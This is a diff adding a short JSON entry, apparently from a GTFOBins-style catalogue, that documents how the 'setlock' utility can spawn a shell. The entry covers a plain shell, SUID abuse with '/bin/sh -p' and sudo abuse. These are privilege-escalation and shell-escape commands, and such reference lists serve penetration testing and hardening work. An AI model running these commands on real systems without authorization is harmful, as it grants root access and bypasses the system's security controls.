@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "TF=$(mktemp)\nsetlock $TF /bin/sh\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./setlock - /bin/sh -p\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo setlock - /bin/sh\n"
+      }
+    ]
+  }
+}
